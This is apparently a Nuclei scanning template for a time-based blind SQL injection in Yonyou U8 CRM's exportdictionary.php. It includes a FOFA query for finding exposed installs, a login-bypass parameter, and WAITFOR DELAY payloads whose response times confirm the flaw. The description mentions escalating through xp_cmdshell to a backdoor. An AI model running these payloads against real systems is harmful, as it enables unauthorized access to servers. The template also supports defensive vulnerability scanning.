id: yongyouU8-CRM-exportdictionary_php-sql

info:
  name: 用友U8 CRM exportdictionary.php SQL延时注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="用友U8CRM"
    用友 U8 CRM客户关系管理系统 exportdictionary.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487066&idx=1&sn=0e992e5a969345ede577afa57d9d37e7&chksm=c267bb69f510327fab10f1c24e4f5cecfe1b1f104175136571c09a650292440bc874d12e052f&token=101124693&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Cookie: PHPSESSID=bgsesstimeout-;

      - |
        GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Cookie: PHPSESSID=bgsesstimeout-;

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and



